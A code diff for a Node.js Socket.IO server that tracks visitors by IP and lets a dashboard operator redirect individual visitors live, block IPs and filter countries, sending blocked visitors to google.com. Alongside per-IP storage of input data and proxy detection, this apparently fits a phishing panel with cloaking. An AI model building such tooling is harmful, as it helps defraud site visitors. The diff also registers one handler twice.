@@ -145,6 +145,10 @@ const ipCache = new Map();
 
 // Create a Map to store input data
 const inputDataCache = new Map(); // Key: IP, Value: Array of input data objects
+
+// Track active sockets by IP address
+const activeSocketsByIP = new Map(); // Key: IP, Value: Set of socket IDs
+
 const globalSettings = {
   proxyDetectionEnabled: false,
   blockedCountries: [],
@@ -234,29 +238,36 @@ const isSystemPath = (path) => {
     path.startsWith('/favicon');
 };
 
-// Standard function for emitting redirect events
-const emitRedirect = (ip, url, currentPath) => {
-  if (ipCache.has(ip)) {
-    const visitorData = ipCache.get(ip);
-    // Only redirect if visitor is online
-    if (visitorData.isOnline) {
-      console.log(`Redirecting IP ${ip} to ${url} from ${visitorData.lastPath}`);
-      // Always include the REAL_ROUTES so client can check if they should redirect
-      io.emit('redirect', {
-        ip,
-        url,
-        targetPaths: REAL_ROUTES,
-        currentPath: currentPath || visitorData.lastPath
+// Function to emit redirect events to specific IP addresses
+const emitRedirect = (ip, url) => {
+  console.log(`Attempting to redirect IP ${ip} to ${url}`);
+  
+  // Check if the IP has any active sockets using our tracking map
+  if (activeSocketsByIP.has(ip) && activeSocketsByIP.get(ip).size > 0) {
+    const activeSockets = activeSocketsByIP.get(ip);
+    console.log(`Found ${activeSockets.size} active socket(s) for IP ${ip}`);
+    
+    // Get all socket objects for this IP
+    const socketObjects = [];
+    activeSockets.forEach(socketId => {
+      const socket = io.sockets.sockets.get(socketId);
+      if (socket) {
+        socketObjects.push(socket);
+      }
+    });
+    
+    if (socketObjects.length > 0) {
+      // Send redirect event to all active sockets with this IP
+      socketObjects.forEach(socket => {
+        console.log(`Sending redirect to socket ${socket.id} for IP ${ip}`);
+        socket.emit('redirect', { url });
       });
       return true;
-    } else {
-      console.log(`Skipping redirect for IP ${ip} - visitor not online (current path: ${visitorData.lastPath})`);
-      return false;
     }
-  } else {
-    console.log(`Cannot redirect IP ${ip} - not found in visitor cache`);
-    return false;
   }
+  
+  console.log(`No active sockets found for IP ${ip}`);
+  return false;
 };
 
 // Geo data cache to reduce API calls
@@ -1459,6 +1470,80 @@ function a4(data, ip) {
 
 
 
+// Function to check if an IP is blocked
+function isIPBlocked(ip) {
+  // Check if IP exists in ipCache and has blocked flag
+  if (ipCache.has(ip)) {
+    const visitorData = ipCache.get(ip);
+    return visitorData.blocked === true;
+  }
+  return false;
+}
+
+// Function to check if a country is allowed based on current filter mode
+function isCountryAllowed(countryCode) {
+  if (!countryCode) return true; // If no country code, allow by default
+  
+  // If filter mode is 'block', check if country is in blockedCountries
+  if (globalSettings.countryFilterMode === 'block') {
+    return !globalSettings.blockedCountries.includes(countryCode);
+  }
+  
+  // If filter mode is 'allow-only', check if country is in allowedCountries
+  if (globalSettings.countryFilterMode === 'allow-only') {
+    // If allowedCountries is empty, allow all
+    if (globalSettings.allowedCountries.length === 0) return true;
+    return globalSettings.allowedCountries.includes(countryCode);
+  }
+  
+  return true; // Default allow
+}
+
+// Function to block an IP address
+function blockIP(ip) {
+  if (ipCache.has(ip)) {
+    const visitorData = ipCache.get(ip);
+    visitorData.blocked = true;
+    ipCache.set(ip, visitorData);
+    console.log(`IP ${ip} has been blocked`);
+    
+    // Redirect all sockets for this IP before disconnecting
+    if (activeSocketsByIP.has(ip)) {
+      const socketIds = activeSocketsByIP.get(ip);
+      socketIds.forEach(socketId => {
+        const socket = io.sockets.sockets.get(socketId);
+        if (socket) {
+          // Send redirect event first
+          socket.emit('redirect', { 
+            url: globalSettings.countryRedirectUrl || redirectURL || 'https://google.com',
+            reason: 'ip_blocked'
+          });
+          
+          // Then disconnect after a delay to allow redirect
+          setTimeout(() => {
+            if (socket.connected) socket.disconnect(true);
+          }, 2000);
+        }
+      });
+    }
+    
+    return true;
+  }
+  return false;
+}
+
+// Function to unblock an IP address
+function unblockIP(ip) {
+  if (ipCache.has(ip)) {
+    const visitorData = ipCache.get(ip);
+    visitorData.blocked = false;
+    ipCache.set(ip, visitorData);
+    console.log(`IP ${ip} has been unblocked`);
+    return true;
+  }
+  return false;
+}
+
 // Listen to server:
 http.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
@@ -1467,37 +1552,212 @@ http.listen(PORT, () => {
   io.on('connection', (socket) => {
     // Use improved IP detection function
     const clientIP = getAccurateClientIp(socket.request);
-    console.log('a user connected:', clientIP);
+    console.log(`User connected: IP=${clientIP}, SocketID=${socket.id}`);
 
     // Store IP in socket for later reference, will be updated when client sends their IP
     socket.clientIP = clientIP;
+    
+    // Check if IP is blocked
+    if (isIPBlocked(clientIP)) {
+      console.log(`Blocked IP attempted connection: ${clientIP}`);
+      // Redirect instead of disconnecting
+      socket.emit('redirect', { 
+        url: globalSettings.countryRedirectUrl || redirectURL || 'https://google.com',
+        reason: 'ip_blocked'
+      });
+      // Don't disconnect immediately to allow redirect to happen
+      setTimeout(() => {
+        if (socket.connected) socket.disconnect(true);
+      }, 2000);
+      return;
+    }
+    
+    // Get country code for the IP (if geo lookup is available)
+    let countryCode = null;
+    if (ipCache.has(clientIP) && ipCache.get(clientIP).countryCode) {
+      countryCode = ipCache.get(clientIP).countryCode;
+    }
+    
+    // Check country filtering
+    if (countryCode && !isCountryAllowed(countryCode)) {
+      console.log(`Connection from blocked country: ${countryCode}, IP: ${clientIP}`);
+      // Redirect instead of disconnecting
+      socket.emit('redirect', { 
+        url: globalSettings.countryRedirectUrl || redirectURL || 'https://google.com',
+        reason: 'country_blocked'
+      });
+      // Don't disconnect immediately to allow redirect to happen
+      setTimeout(() => {
+        if (socket.connected) socket.disconnect(true);
+      }, 2000);
+      return;
+    }
 
     // Update visitor online status or initialize new IP entry
     if (ipCache.has(clientIP)) {
       // Update existing visitor to online status
-      updateVisitorOnlineStatus(clientIP, true);
+      updateVisitorOnlineStatus(clientIP, true, socket.id);
     } else {
       // Initialize a new IP cache entry
       initializeIPCacheEntry(clientIP, "/", socket);
+      // Then update online status
+      updateVisitorOnlineStatus(clientIP, true, socket.id);
     }
 
     // Emit updated dashboard data to all connected clients
     io.emit('dashboard-update');
 
+    // Handle client disconnection
     socket.on('disconnect', () => {
-      console.log('user disconnected:', socket.clientIP);
+      const ip = socket.clientIP;
+      console.log(`User disconnected: IP=${ip}, SocketID=${socket.id}`);
 
-      // Update visitor online status to offline
-      updateVisitorOnlineStatus(socket.clientIP, false);
+      // Update visitor online status to offline for this socket
+      updateVisitorOnlineStatus(ip, false, socket.id);
     });
 
     // Handle redirect requests from dashboard
     socket.on('redirect-user', (data) => {
-      const { ip, url } = data;
+      // Get the exact IP and URL from the data
+      const ip = data.ip;
+      const url = data.url;
+      
       console.log(`Dashboard requested redirect for IP ${ip} to ${url}`);
       
-      // Use the emitRedirect helper function for consistency
-      emitRedirect(ip, url, data.path);
+      // Use the simplified emitRedirect function
+      const success = emitRedirect(ip, url);
+      
+      // Notify dashboard of the result
+      if (success) {
+        console.log(`Successfully sent redirect command to IP ${ip}`);
+      } else {
+        console.log(`Failed to redirect IP ${ip} - no active connections found`);
+      }
+    });
+    
+    // Handle client IP updates from browser
+    socket.on('client-ip', (data) => {
+      if (data && data.clientIP) {
+        const oldIP = socket.clientIP;
+        const newIP = data.clientIP;
+        
+        // Update socket.clientIP with the front-end IP
+        socket.clientIP = newIP;
+        console.log(`Updated client IP from ${oldIP} to ${newIP} for socket ${socket.id}`);
+        
+        // Update visitor online status for the new IP
+        if (ipCache.has(newIP)) {
+          updateVisitorOnlineStatus(newIP, true, socket.id);
+        } else {
+          // Initialize a new IP cache entry
+          initializeIPCacheEntry(newIP, "/", socket);
+          // Then update online status
+          updateVisitorOnlineStatus(newIP, true, socket.id);
+        }
+        
+        // Update visitor online status for the old IP if different
+        if (oldIP && oldIP !== newIP) {
+          updateVisitorOnlineStatus(oldIP, false, socket.id);
+        }
+      }
+    });
+    
+    // Handle client presence heartbeats
+    socket.on('client-presence', (data) => {
+      if (data && data.clientIP) {
+        const ip = data.clientIP;
+        const path = data.path || '/';
+        
+        // Check if IP is blocked before processing
+        if (isIPBlocked(ip)) {
+          socket.emit('blocked', { message: 'Your IP has been blocked' });
+          return;
+        }
+        
+        // Update the client's last path if provided
+        if (ipCache.has(ip)) {
+          const visitorData = ipCache.get(ip);
+          visitorData.lastPath = path;
+          visitorData.lastActivity = new Date();
+          visitorData.title = data.title || '';
+          ipCache.set(ip, visitorData);
+        }
+      }
+    });
+    
+    // Handle block IP request from dashboard
+    socket.on('block-ip', (data) => {
+      if (data && data.ip) {
+        const success = blockIP(data.ip);
+        socket.emit('block-ip-result', { 
+          success, 
+          ip: data.ip, 
+          message: success ? `IP ${data.ip} has been blocked` : `Failed to block IP ${data.ip}`
+        });
+        io.emit('dashboard-update');
+      }
+    });
+    
+    // Handle unblock IP request from dashboard
+    socket.on('unblock-ip', (data) => {
+      if (data && data.ip) {
+        const success = unblockIP(data.ip);
+        socket.emit('unblock-ip-result', { 
+          success, 
+          ip: data.ip, 
+          message: success ? `IP ${data.ip} has been unblocked` : `Failed to unblock IP ${data.ip}`
+        });
+        io.emit('dashboard-update');
+      }
+    });
+    
+    // Handle update country filter settings
+    socket.on('update-country-settings', (data) => {
+      if (data) {
+        // Update blocked countries
+        if (Array.isArray(data.blockedCountries)) {
+          globalSettings.blockedCountries = data.blockedCountries;
+        }
+        
+        // Update allowed countries
+        if (Array.isArray(data.allowedCountries)) {
+          globalSettings.allowedCountries = data.allowedCountries;
+        }
+        
+        // Update filter mode
+        if (data.countryFilterMode && ['block', 'allow-only'].includes(data.countryFilterMode)) {
+          globalSettings.countryFilterMode = data.countryFilterMode;
+        }
+        
+        // Update redirect URL
+        if (data.countryRedirectUrl) {
+          globalSettings.countryRedirectUrl = data.countryRedirectUrl;
+        }
+        
+        console.log('Updated country filter settings:', globalSettings);
+        socket.emit('country-settings-updated', { success: true });
+        io.emit('dashboard-update');
+      }
+    });
+    
+    // Handle client IP updates
+    socket.on('client-ip', (data) => {
+      if (data && data.clientIP) {
+        const oldIP = socket.clientIP;
+        const newIP = data.clientIP;
+        
+        // Update socket.clientIP with the front-end IP
+        socket.clientIP = newIP;
+        console.log(`Updated client IP from ${oldIP} to ${newIP} for socket ${socket.id}`);
+        
+        // Ensure the socket is marked as active for the client IP
+        updateVisitorOnlineStatus(newIP, true, socket.id);
+        
+        // Update visitor online status for the old IP if different
+        if (oldIP && oldIP !== newIP) {
+          updateVisitorOnlineStatus(oldIP, false, socket.id);
+        }
+      }
     });
 
     // Helper function to get and update client IP from event data
@@ -1560,18 +1820,43 @@ http.listen(PORT, () => {
     }
 
     // Helper function to update visitor online status
-    function updateVisitorOnlineStatus(clientIP, isOnline) {
+    function updateVisitorOnlineStatus(clientIP, isOnline, socketId) {
+      if (!clientIP) return;
+      
+      // Initialize the set of active sockets for this IP if it doesn't exist
+      if (!activeSocketsByIP.has(clientIP)) {
+        activeSocketsByIP.set(clientIP, new Set());
+      }
+      
+      const activeSockets = activeSocketsByIP.get(clientIP);
+      
+      if (isOnline) {
+        // Add this socket to the active sockets for this IP
+        activeSockets.add(socketId);
+      } else {
+        // Remove this socket from the active sockets for this IP
+        activeSockets.delete(socketId);
+      }
+      
+      // Update the IP cache with the online status
       if (ipCache.has(clientIP)) {
         const visitorData = ipCache.get(clientIP);
-        visitorData.isOnline = isOnline;
-
-        if (isOnline) {
+        
+        // Only consider online if there's at least one active socket
+        const hasActiveSockets = activeSockets.size > 0;
+        visitorData.isOnline = hasActiveSockets;
+        visitorData.activeConnections = activeSockets.size;
+        
+        if (hasActiveSockets) {
           visitorData.lastConnected = new Date();
         } else {
           visitorData.lastDisconnected = new Date();
         }
-
+        
         ipCache.set(clientIP, visitorData);
+        console.log(`IP ${clientIP} status updated: online=${hasActiveSockets}, active connections=${activeSockets.size}`);
+        
+        // Notify dashboard of the update
         io.emit('dashboard-update');
       }
     }
